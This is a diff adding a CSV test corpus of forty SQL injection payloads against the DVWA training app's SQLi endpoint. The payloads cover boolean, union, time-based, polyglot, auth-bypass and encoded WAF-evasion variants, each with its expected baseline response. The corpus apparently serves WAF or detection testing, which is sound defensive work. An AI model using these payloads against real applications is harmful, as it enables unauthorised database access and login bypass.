@@ -1,0 +1,41 @@
+payload_id,attack_type,attack_subtype,evasion_type,dvwa_endpoint,param,method,payload,expected_baseline_behavior,notes
+SQLI001,sqli,entry_point_detection,single_quote,/vulnerabilities/sqli/,id,GET,',error_or_response_change,Single quote probe to test SQL parser handling
+SQLI002,sqli,boolean_based,basic_or_true,/vulnerabilities/sqli/,id,GET,1 OR 1=1,results_returned,Classic boolean-based SQL injection
+SQLI003,sqli,boolean_based,string_or_true,/vulnerabilities/sqli/,id,GET,' OR '1'='1,results_returned,String-based OR true condition
+SQLI004,sqli,union_based,basic_union,/vulnerabilities/sqli/,id,GET,"1 UNION SELECT 1,2",union_response_or_error,Union SELECT probe for column response behaviour
+SQLI005,sqli,error_based,basic_error,/vulnerabilities/sqli/,id,GET,1',sql_error_or_response_change,Quote-based error probe
+SQLI006,sqli,waf_bypass,no_space_comment,/vulnerabilities/sqli/,id,GET,1/**/OR/**/1=1,results_returned,No-space bypass using inline comments
+SQLI007,sqli,waf_bypass,case_modification,/vulnerabilities/sqli/,id,GET,1 oR 1=1,results_returned,Mixed-case keyword variation
+SQLI008,sqli,waf_bypass,url_encoded,/vulnerabilities/sqli/,id,GET,%27%20OR%20%271%27%3D%271,results_returned,URL-encoded string OR true payload
+SQLI009,sqli,time_based,sleep_probe,/vulnerabilities/sqli/,id,GET,1 AND SLEEP(2),delayed_response_or_blocked,Time-based SQLi probe
+SQLI010,sqli,boolean_based,and_true,/vulnerabilities/sqli/,id,GET,1 AND 1=1,normal_result,Boolean AND true condition
+SQLI011,sqli,boolean_based,and_false,/vulnerabilities/sqli/,id,GET,1 AND 1=2,different_result,Boolean AND false condition
+SQLI012,sqli,waf_bypass,plus_as_space,/vulnerabilities/sqli/,id,GET,1+OR+1=1,results_returned,Plus signs used as encoded spaces
+SQLI013,sqli,boolean_based,errorbased_or_true,/vulnerabilities/sqli/,id,GET,"1 OR 1=1#",results_returned,PayloadsAllTheThings Generic_ErrorBased OR true with hash comment
+SQLI014,sqli,boolean_based,errorbased_or_false,/vulnerabilities/sqli/,id,GET,"1 OR 1=0#",different_result,PayloadsAllTheThings Generic_ErrorBased OR false with hash comment
+SQLI015,sqli,boolean_based,dash_comment,/vulnerabilities/sqli/,id,GET,"1 OR 1=1-- ",results_returned,PayloadsAllTheThings Generic_ErrorBased OR true with dash comment
+SQLI016,sqli,boolean_based,having_true,/vulnerabilities/sqli/,id,GET,"1 HAVING 1=1",results_or_error,PayloadsAllTheThings Generic_ErrorBased HAVING true pattern
+SQLI017,sqli,boolean_based,having_false,/vulnerabilities/sqli/,id,GET,"1 HAVING 1=0",different_result_or_error,PayloadsAllTheThings Generic_ErrorBased HAVING false pattern
+SQLI018,sqli,boolean_based,like_true,/vulnerabilities/sqli/,id,GET,"1 OR 'a' LIKE 'a'",results_returned,LIKE-based boolean true condition
+SQLI019,sqli,time_based,sleep_hash,/vulnerabilities/sqli/,id,GET,"1 or sleep(2)#",delayed_response_or_blocked,PayloadsAllTheThings Generic_TimeBased sleep with hash comment
+SQLI020,sqli,time_based,quote_sleep,/vulnerabilities/sqli/,id,GET,"' or sleep(2)#",delayed_response_or_blocked,PayloadsAllTheThings Generic_TimeBased quoted sleep payload
+SQLI021,sqli,time_based,parentheses_sleep,/vulnerabilities/sqli/,id,GET,"1) or sleep(2)#",delayed_response_or_blocked,PayloadsAllTheThings Generic_TimeBased parenthesis sleep payload
+SQLI022,sqli,time_based,double_parentheses_sleep,/vulnerabilities/sqli/,id,GET,"1)) or sleep(2)#",delayed_response_or_blocked,PayloadsAllTheThings Generic_TimeBased double-parenthesis sleep payload
+SQLI023,sqli,mysql_specific,and_true,/vulnerabilities/sqli/,id,GET,"1 and 1=1",results_returned,PayloadsAllTheThings FUZZDB_MYSQL basic AND true
+SQLI024,sqli,mysql_specific,quoted_and_count,/vulnerabilities/sqli/,id,GET,"1' and 1=(select count(*) from tablenames); --",sql_error_or_response_change,PayloadsAllTheThings FUZZDB_MYSQL count subquery probe
+SQLI025,sqli,mysql_specific,or_true,/vulnerabilities/sqli/,id,GET,"1 or 1=1",results_returned,PayloadsAllTheThings FUZZDB_MYSQL OR true
+SQLI026,sqli,mysql_specific,quoted_or_true,/vulnerabilities/sqli/,id,GET,"1' or '1'='1",results_returned,PayloadsAllTheThings FUZZDB_MYSQL quoted OR true
+SQLI027,sqli,polyglot,sleep_comment,/vulnerabilities/sqli/,id,GET,"SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/",delayed_response_or_blocked,PayloadsAllTheThings SQLi_Polyglots sleep comment polyglot
+SQLI028,sqli,waf_bypass,tab_as_space,/vulnerabilities/sqli/,id,GET,"1	OR	1=1",results_returned,Tab characters used as spaces
+SQLI029,sqli,waf_bypass,newline_encoded,/vulnerabilities/sqli/,id,GET,"1%0AOR%0A1=1",results_returned,Encoded newline separator
+SQLI030,sqli,waf_bypass,double_encoded_or,/vulnerabilities/sqli/,id,GET,"%2527%2520OR%25201%253D1",results_returned,Double-encoded quote OR true
+SQLI031,sqli,waf_bypass,inline_comment_keyword,/vulnerabilities/sqli/,id,GET,"1 O/**/R 1=1",results_returned,Inline comment inserted inside OR keyword
+SQLI032,sqli,union_based,basic_union_null,/vulnerabilities/sqli/,id,GET,"1 UNION SELECT NULL,NULL",union_response_or_error,UNION SELECT with NULL values
+SQLI033,sqli,union_based,union_comment_suffix,/vulnerabilities/sqli/,id,GET,"1 UNION SELECT 1,2-- -",union_response_or_error,UNION SELECT with comment suffix
+SQLI034,sqli,union_based,union_case_modified,/vulnerabilities/sqli/,id,GET,"1 uNiOn SeLeCt 1,2",union_response_or_error,Mixed-case UNION SELECT
+SQLI035,sqli,union_based,commented_spaces_union,/vulnerabilities/sqli/,id,GET,"1/**/UNION/**/SELECT/**/1,2",union_response_or_error,UNION SELECT using comment separators
+SQLI036,sqli,auth_bypass,or_empty_dash,/vulnerabilities/sqli/,id,GET,"' or ''-'",auth_bypass_style_response,PayloadsAllTheThings Auth_Bypass style payload adapted to SQLi parameter
+SQLI037,sqli,auth_bypass,or_empty_space,/vulnerabilities/sqli/,id,GET,"' or '' '",auth_bypass_style_response,PayloadsAllTheThings Auth_Bypass style payload adapted to SQLi parameter
+SQLI038,sqli,auth_bypass,or_empty_star,/vulnerabilities/sqli/,id,GET,"' or ''*'",auth_bypass_style_response,PayloadsAllTheThings Auth_Bypass style payload adapted to SQLi parameter
+SQLI039,sqli,error_based,or_x_equals_x,/vulnerabilities/sqli/,id,GET,"1 OR x=x",sql_error_or_response_change,PayloadsAllTheThings Generic_ErrorBased symbolic OR comparison
+SQLI040,sqli,error_based,or_x_equals_y,/vulnerabilities/sqli/,id,GET,"1 OR x=y",sql_error_or_response_change,PayloadsAllTheThings Generic_ErrorBased symbolic false comparison
